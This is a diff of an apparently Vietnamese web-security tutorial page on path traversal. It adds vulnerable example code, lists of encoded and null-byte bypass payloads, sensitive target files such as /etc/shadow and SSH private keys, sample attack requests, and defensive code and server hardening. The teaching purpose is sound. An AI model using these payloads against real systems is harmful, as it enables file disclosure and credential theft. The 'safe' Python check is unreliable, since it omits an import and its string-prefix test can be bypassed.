@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Chương 18: Path Traversal — Hieu Nguyen</title>
-  <meta name="description" content="Path traversal, canonicalize, chroot, object key.">
+  <meta name="description" content="Chương 18: Path Traversal — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,44 +40,152 @@
         <span>›</span>
         <span>18. Path Traversal</span>
       </div>
-      <h1>Chương 18: Path Traversal</h1>
-      <p class="lede">Ghép path từ user rồi đọc file. Dấu chấm chấm vẫn là bug 30 năm.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> V — Server-side</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p>Input <code>../</code> hoặc encoding đi ra ngoài thư mục cho phép. Ảnh hưởng read file config, key, hoặc ghi đè.</p>
-<h2 id="phong">Phòng chống</h2>
-<ul>
-        <li>Không ghép path user; dùng ID → object key map.</li>
-        <li>Canonicalize rồi kiểm tra prefix nằm trong root.</li>
-        <li>OS allowlist filename charset.</li>
-        <li>Least privilege FS; không chạy root.</li>
-      </ul>
-<h2 id="devops">Góc nhìn DevOps</h2>
-<p>readOnlyRootFilesystem; volume chỉ data dir. Secret không mount vào chỗ app “download template”.</p>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>Map ID → file.</li>
-        <li>Canonical path check.</li>
-        <li>FS hẹp.</li>
-        <li>Không tin encoding một lần.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>Canonicalize giải quyết gì?</li>
-        <li>URL encoding traversal né filter thế nào (ý tưởng)?</li>
-        <li>Object storage key user-controlled rủi ro?</li>
-        <li>readOnlyRootFS đủ không?</li>
-        <li>Log path đã resolve để làm gì?</li>
-      </ol>
+      <div id="top"></div>
+<header><h1>Chương 18: Path Traversal</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p><strong>Path Traversal</strong> (Directory Traversal — Duyệt thư mục) là lỗ hổng cho phép hacker đọc (đôi khi ghi) files ngoài thư mục được phép bằng cách dùng sequences như <code>../</code> để leo ra khỏi intended directory.</p>
+<p><strong>Mức độ nguy hiểm:</strong> Cao — Đọc <code>/etc/passwd</code>, config files, private keys, source code.</p>
+<hr>
+<h2 id="cách-hoạt-động">Cách hoạt động</h2>
+<pre><code class="language-python"># Vulnerable code: load ảnh theo filename từ user
+def serve_image(filename):
+    path = f&quot;/var/www/app/images/{filename}&quot;
+    return open(path, &#x27;rb&#x27;).read()
 
-      <div class="docs-tags">
-        <span class="docs-tag">path-traversal</span>
-        <span class="docs-tag">lfi</span>
-      </div>
+# Normal: filename = &quot;profile.jpg&quot;
+# Path: /var/www/app/images/profile.jpg → OK
+
+# Attack: filename = &quot;../../../etc/passwd&quot;
+# Path: /var/www/app/images/../../../etc/passwd
+# Resolved: /etc/passwd → lộ!
+</code></pre>
+<hr>
+<h2 id="bypass-techniques">Bypass Techniques</h2>
+<h3 id="basic">Basic</h3>
+<pre><code class="language-text">../../../etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd       URL encoded
+..%252F..%252Fetc%252Fpasswd       Double URL encoded
+....//....//etc/passwd             (khi filter strip ../)
+..././..././etc/passwd             (khi filter strip ../)
+/etc/passwd                        Absolute path
+</code></pre>
+<h3 id="null-byte-php--534">Null Byte (PHP &lt;= 5.3.4)</h3>
+<pre><code class="language-text">../../../etc/passwd%00.jpg
+→ Null byte truncate: path = /etc/passwd (bỏ .jpg)
+</code></pre>
+<h3 id="encode-variations">Encode Variations</h3>
+<pre><code class="language-text">%2e%2e%2f   → ../
+%2e%2e/     → ../
+..%2f       → ../
+%2e./       → ../
+.%2e/       → ./
+%252e%252e%252f → ../ (double encoded)
+..%c0%af    → ../ (overlong UTF-8)
+..%c1%9c    → ../ (overlong UTF-8)
+</code></pre>
+<hr>
+<h2 id="target-files">Target Files</h2>
+<pre><code class="language-bash"># Linux
+/etc/passwd                    # Usernames, shells
+/etc/shadow                    # Password hashes
+/etc/hosts                     # Hostname mapping
+/proc/self/environ             # Environment variables
+/proc/self/cmdline             # Process command line
+~/.ssh/id_rsa                  # SSH private key
+/var/log/apache2/access.log    # Access logs
+/var/log/nginx/error.log       # Error logs
+/etc/nginx/nginx.conf          # Nginx config
+/app/.env                      # App environment variables
+/var/www/html/config.php       # PHP config
+
+# Windows
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\win.ini
+C:\inetpub\wwwroot\web.config
+..\..\..\Windows\win.ini       # Windows path separator
+</code></pre>
+<hr>
+<h2 id="kịch-bản-tấn-công">Kịch bản tấn công</h2>
+<pre><code class="language-text">Target: App cho phép download reports theo filename
+
+GET /api/download?file=report_2024.pdf
+
+Attack:
+GET /api/download?file=../../../../etc/passwd
+
+Nếu bị filter:
+GET /api/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+GET /api/download?file=....//....//....//....//etc/passwd
+</code></pre>
+<hr>
+<h2 id="phòng-chống">Phòng chống</h2>
+<pre><code class="language-python">import os
+from pathlib import Path
+
+def serve_file_safe(filename: str, base_dir: str = &#x27;/var/www/app/uploads&#x27;):
+    # Validate: chỉ alphanumeric, dot, dash, underscore
+    if not re.match(r&#x27;^[a-zA-Z0-9._-]+$&#x27;, filename):
+        raise ValueError(&quot;Invalid filename&quot;)
+    
+    # Resolve real path
+    base = Path(base_dir).resolve()
+    requested = (base / filename).resolve()
+    
+    # Verify file là con của base directory
+    if not str(requested).startswith(str(base)):
+        raise ValueError(&quot;Path traversal detected&quot;)
+    
+    if not requested.exists():
+        raise FileNotFoundError(&quot;File not found&quot;)
+    
+    return requested.read_bytes()
+
+# Hoặc dùng os.path
+def is_safe_path(base_dir, requested_path):
+    base = os.path.realpath(base_dir)
+    resolved = os.path.realpath(os.path.join(base_dir, requested_path))
+    return resolved.startswith(base)
+</code></pre>
+<hr>
+<h2 id="góc-nhìn-devops">Góc nhìn DevOps</h2>
+<p><strong>Nginx: chroot-like file serving:</strong></p>
+<pre><code class="language-nginx"># Nginx alias thay vì root — hạn chế path
+location /downloads/ {
+    alias /var/uploads/;
+    
+    # Chỉ serve certain file types
+    location ~* \.(pdf|xlsx|csv)$ {
+        add_header Content-Disposition &quot;attachment&quot;;
+    }
+    
+    # Block mọi thứ khác
+    location ~ {
+        return 403;
+    }
+}
+</code></pre>
+<p><strong>Container: Read-only filesystem:</strong></p>
+<pre><code class="language-yaml">securityContext:
+  readOnlyRootFilesystem: true  # Root FS read-only
+  # Nếu có path traversal, không ghi được file
+</code></pre>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>Path traversal: <code>../</code> để thoát khỏi thư mục mục tiêu.</li>
+<li>Bypass: URL encoding, double encoding, null byte, stripped sequence bypass.</li>
+<li>Phòng chống: validate filename, check resolved path nằm trong base directory.</li>
+<li>Lưu files bên ngoài webroot và không dùng user input trực tiếp làm filename.</li>
+</ul>
+<hr>
+<h2 id="câu-hỏi-ôn-tập">Câu hỏi ôn tập</h2>
+<ol>
+<li>Tại sao filter đơn giản loại bỏ <code>../</code> không đủ để phòng chống path traversal?</li>
+<li>Null byte attack hoạt động như thế nào với path traversal?</li>
+<li>Làm thế nào để verify đường dẫn file nằm trong thư mục được phép?</li>
+<li>Trên Windows, path traversal có gì khác so với Linux?</li>
+<li><code>realpath()</code> giúp gì trong việc phòng chống path traversal?</li>
+</ol>
       <div class="docs-pager">
         <a href="../17/">Previous · 17. File Upload</a>
         <a href="../19/">Next · 19. Open Redirect</a>
@@ -86,11 +194,18 @@
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#phong">Phòng chống</a>
-        <a href="#devops">Góc nhìn DevOps</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#cách-hoạt-động">Cách hoạt động</a>
+        <a href="#bypass-techniques">Bypass Techniques</a>
+        <a class="depth-3" href="#basic">Basic</a>
+        <a class="depth-3" href="#null-byte-php--534">Null Byte (PHP &lt;= 5.3.4)</a>
+        <a class="depth-3" href="#encode-variations">Encode Variations</a>
+        <a href="#target-files">Target Files</a>
+        <a href="#kịch-bản-tấn-công">Kịch bản tấn công</a>
+        <a href="#phòng-chống">Phòng chống</a>
+        <a href="#góc-nhìn-devops">Góc nhìn DevOps</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
+        <a href="#câu-hỏi-ôn-tập">Câu hỏi ôn tập</a>
       </nav>
     </aside>
   </div>
